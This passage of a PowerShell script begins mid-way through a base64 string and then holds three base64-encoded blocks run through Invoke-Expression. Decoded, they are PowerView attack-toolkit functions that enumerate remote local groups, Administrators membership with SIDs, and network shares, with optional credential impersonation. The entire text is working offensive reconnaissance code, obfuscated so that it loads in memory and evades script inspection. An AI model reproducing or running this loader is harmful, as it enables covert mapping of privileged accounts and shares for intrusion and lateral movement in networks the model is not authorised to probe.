gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPTmFtZScgJEdQTy5uYW1lCiAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQTy5kaXNwbGF5bmFtZQogICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldExvY2FsR3JvdXAgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cC5BUEknKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cC5XaW5OVCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAkRW52OkNPTVBVVEVSTkFNRSwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0FQSScsICdXaW5OVCcpXQogICAgICAgIFtBbGlhcygnQ29sbGVjdGlvbk1ldGhvZCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1ldGhvZCA9ICdBUEknLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgIGlmICgkTWV0aG9kIC1lcSAnQVBJJykgewogICAgICAgICAgICAgICAgJFF1ZXJ5TGV2ZWwgPSAxCiAgICAgICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAkRW50cmllc1JlYWQgPSAwCiAgICAgICAgICAgICAgICAkVG90YWxSZWFkID0gMAogICAgICAgICAgICAgICAgJFJlc3VtZUhhbmRsZSA9IDAKICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkTmV0YXBpMzI6Ok5ldExvY2FsR3JvdXBFbnVtKCRDb21wdXRlciwgJFF1ZXJ5TGV2ZWwsIFtyZWZdJFB0ckluZm8sIC0xLCBbcmVmXSRFbnRyaWVzUmVhZCwgW3JlZl0kVG90YWxSZWFkLCBbcmVmXSRSZXN1bWVIYW5kbGUpCiAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJFB0ckluZm8uVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CiAgICAgICAgICAgICAgICAgICAgJEluY3JlbWVudCA9ICRMT0NBTEdST1VQX0lORk9fMTo6R2V0U2l6ZSgpCiAgICAgICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJEVudHJpZXNSZWFkKTsgJGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICAgICAkSW5mbyA9ICROZXdJbnRQdHIgLWFzICRMT0NBTEdST1VQX0lORk9fMQogICAgICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJE5ld0ludFB0ci5Ub0ludDY0KCkKICAgICAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRJbmZvLmxncnBpMV9uYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbW1lbnQnICRJbmZvLmxncnBpMV9jb21tZW50CiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Mb2NhbEdyb3VwLkFQSScpCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICROdWxsID0gJE5ldGFwaTMyOjpOZXRBcGlCdWZmZXJGcmVlKCRQdHJJbmZvKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRMb2NhbEdyb3VwXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRDb21wdXRlclByb3ZpZGVyID0gW0FEU0ldIldpbk5UOi8vJENvbXB1dGVyLGNvbXB1dGVyIgogICAgICAgICAgICAgICAgJENvbXB1dGVyUHJvdmlkZXIucHNiYXNlLmNoaWxkcmVuIHwgV2hlcmUtT2JqZWN0IHsgJF8ucHNiYXNlLnNjaGVtYUNsYXNzTmFtZSAtZXEgJ2dyb3VwJyB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwID0gKFtBRFNJXSRfKQogICAgICAgICAgICAgICAgICAgICRHcm91cCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAoJExvY2FsR3JvdXAuSW52b2tlR2V0KCdOYW1lJykpCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NJRCcgKChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRMb2NhbEdyb3VwLkludm9rZUdldCgnb2JqZWN0c2lkJyksMCkpLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21tZW50JyAoJExvY2FsR3JvdXAuSW52b2tlR2V0KCdEZXNjcmlwdGlvbicpKQogICAgICAgICAgICAgICAgICAgICRHcm91cC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuTG9jYWxHcm91cC5XaW5OVCcpCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldExvY2FsR3JvdXBNZW1iZXIgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cE1lbWJlci5BUEknKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cE1lbWJlci5XaW5OVCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRFbnY6Q09NUFVURVJOQU1FLAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdyb3VwTmFtZSA9ICdBZG1pbmlzdHJhdG9ycycsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBUEknLCAnV2luTlQnKV0KICAgICAgICBbQWxpYXMoJ0NvbGxlY3Rpb25NZXRob2QnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRNZXRob2QgPSAnQVBJJywKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICBpZiAoJE1ldGhvZCAtZXEgJ0FQSScpIHsKICAgICAgICAgICAgICAgICRRdWVyeUxldmVsID0gMgogICAgICAgICAgICAgICAgJFB0ckluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgJEVudHJpZXNSZWFkID0gMAogICAgICAgICAgICAgICAgJFRvdGFsUmVhZCA9IDAKICAgICAgICAgICAgICAgICRSZXN1bWVIYW5kbGUgPSAwCiAgICAgICAgICAgICAgICAkUmVzdWx0ID0gJE5ldGFwaTMyOjpOZXRMb2NhbEdyb3VwR2V0TWVtYmVycygkQ29tcHV0ZXIsICRHcm91cE5hbWUsICRRdWVyeUxldmVsLCBbcmVmXSRQdHJJbmZvLCAtMSwgW3JlZl0kRW50cmllc1JlYWQsIFtyZWZdJFRvdGFsUmVhZCwgW3JlZl0kUmVzdW1lSGFuZGxlKQogICAgICAgICAgICAgICAgJE9mZnNldCA9ICRQdHJJbmZvLlRvSW50NjQoKQogICAgICAgICAgICAgICAgJE1lbWJlcnMgPSBAKCkKICAgICAgICAgICAgICAgIGlmICgoJFJlc3VsdCAtZXEgMCkgLWFuZCAoJE9mZnNldCAtZ3QgMCkpIHsKICAgICAgICAgICAgICAgICAgICAkSW5jcmVtZW50ID0gJExPQ0FMR1JPVVBfTUVNQkVSU19JTkZPXzI6OkdldFNpemUoKQogICAgICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICRFbnRyaWVzUmVhZCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE5ld0ludFB0ciA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQKICAgICAgICAgICAgICAgICAgICAgICAgJEluZm8gPSAkTmV3SW50UHRyIC1hcyAkTE9DQUxHUk9VUF9NRU1CRVJTX0lORk9fMgogICAgICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJE5ld0ludFB0ci5Ub0ludDY0KCkKICAgICAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgICAgICAgICAgICAgICRTaWRTdHJpbmcgPSAnJwogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0MiA9ICRBZHZhcGkzMjo6Q29udmVydFNpZFRvU3RyaW5nU2lkKCRJbmZvLmxncm1pMl9zaWQsIFtyZWZdJFNpZFN0cmluZyk7JExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdDIgLWVxIDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0TG9jYWxHcm91cE1lbWJlcl0gRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcikuTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyTmFtZScgJEluZm8ubGdybWkyX2RvbWFpbmFuZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU0lEJyAkU2lkU3RyaW5nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9ICQoJEluZm8ubGdybWkyX3NpZHVzYWdlIC1lcSAnU2lkVHlwZUdyb3VwJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNHcm91cCcgJElzR3JvdXAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkxvY2FsR3JvdXBNZW1iZXIuQVBJJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJzICs9ICRNZW1iZXIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKICAgICAgICAgICAgICAgICAgICAkTWFjaGluZVNpZCA9ICRNZW1iZXJzIHwgV2hlcmUtT2JqZWN0IHskXy5TSUQgLW1hdGNoICcuKi01MDAnIC1vciAoJF8uU0lEIC1tYXRjaCAnLiotNTAxJyl9IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kIFNJRAogICAgICAgICAgICAgICAgICAgIGlmICgkTWFjaGluZVNpZCkgewogICAgICAgICAgICAgICAgICAgICAgICAkTWFjaGluZVNpZCA9ICRNYWNoaW5lU2lkLlN1YnN0cmluZygwLCAkTWFjaGluZVNpZC5MYXN0SW5kZXhPZignLScpKQogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5TSUQgLW1hdGNoICRNYWNoaW5lU2lkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNEb21haW4nICRGYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNEb21haW4nICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLlNJRCAtbm90bWF0Y2ggJ1MtMS01LTIxJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzRG9tYWluJyAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzRG9tYWluJyAnVU5LTk9XTicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkTWVtYmVycwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRMb2NhbEdyb3VwTWVtYmVyXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwUHJvdmlkZXIgPSBbQURTSV0iV2luTlQ6Ly8kQ29tcHV0ZXIvJEdyb3VwTmFtZSxncm91cCIKICAgICAgICAgICAgICAgICAgICAkR3JvdXBQcm92aWRlci5wc2Jhc2UuSW52b2tlKCdNZW1iZXJzJykgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJExvY2FsVXNlciA9IChbQURTSV0kXykKICAgICAgICAgICAgICAgICAgICAgICAgJEFkc1BhdGggPSAkTG9jYWxVc2VyLkludm9rZUdldCgnQWRzUGF0aCcpLlJlcGxhY2UoJ1dpbk5UOi8vJywgJycpCiAgICAgICAgICAgICAgICAgICAgICAgICRJc0dyb3VwID0gKCRMb2NhbFVzZXIuU2NoZW1hQ2xhc3NOYW1lIC1saWtlICdncm91cCcpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKChbcmVnZXhdOjpNYXRjaGVzKCRBZHNQYXRoLCAnLycpKS5jb3VudCAtZXEgMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzRG9tYWluID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROYW1lID0gJEFkc1BhdGguUmVwbGFjZSgnLycsICdcJykKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJJc0RvbWFpbiA9ICRGYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5hbWUgPSAkQWRzUGF0aC5TdWJzdHJpbmcoJEFkc1BhdGguSW5kZXhPZignLycpKzEpLlJlcGxhY2UoJy8nLCAnXCcpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdBY2NvdW50TmFtZScgJE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTSUQnICgoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkTG9jYWxVc2VyLkludm9rZUdldCgnT2JqZWN0U0lEJyksMCkpLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzR3JvdXAnICRJc0dyb3VwCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNEb21haW4nICRNZW1iZXJJc0RvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0TG9jYWxHcm91cE1lbWJlcl0gRXJyb3IgZm9yICRDb21wdXRlciA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFNoYXJlIHsKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU2hhcmVJbmZvJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICRRdWVyeUxldmVsID0gMQogICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICRFbnRyaWVzUmVhZCA9IDAKICAgICAgICAgICAgJFRvdGFsUmVhZCA9IDAKICAgICAgICAgICAgJFJlc3VtZUhhbmRsZSA9IDAKICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6TmV0U2hhcmVFbnVtKCRDb21wdXRlciwgJFF1ZXJ5TGV2ZWwsIFtyZWZdJFB0ckluZm8sIC0xLCBbcmVmXSRFbnRyaWVzUmVhZCwgW3JlZl0kVG90YWxSZWFkLCBbcmVmXSRSZXN1bWVIYW5kbGUpCiAgICAgICAgICAgICRPZmZzZXQgPSAkUHRySW5mby5Ub0ludDY0KCkKICAgICAgICAgICAgaWYgKCgkUmVzdWx0IC1lcSAwKSAtYW5kICgkT2Zmc2V0IC1ndCAwKSkgewogICAgICAgICAgICAgICAgJEluY3JlbWVudCA9ICRTSEFSRV9JTkZPXzE6OkdldFNpemUoKQogICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJEVudHJpZXNSZWFkKTsgJGkrKykgewogICAgICAgICAgICAgICAgICAgICROZXdJbnRQdHIgPSBOZXctT2JqZWN0IFN5c3RlbS5JbnRwdHIgLUFyZ3VtZW50TGlzdCAkT2Zmc2V0CiAgICAgICAgICAgICAgICAgICAgJEluZm8gPSAkTmV3SW50UHRyIC1hcyAkU0hBUkVfSU5GT18xCiAgICAgICAgICAgICAgICAgICAgJFNoYXJlID0gJEluZm8gfCBTZWxlY3QtT2JqZWN0ICoKICAgICAgICAgICAgICAgICAgICAkU2hhcmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkU2hhcmUuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlNoYXJlSW5mbycpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCA9ICROZXdJbnRQdHIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgICAgICAgICAgJFNoYXJlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0U2hhcmVdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRSZXN1bHQpLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0K")))

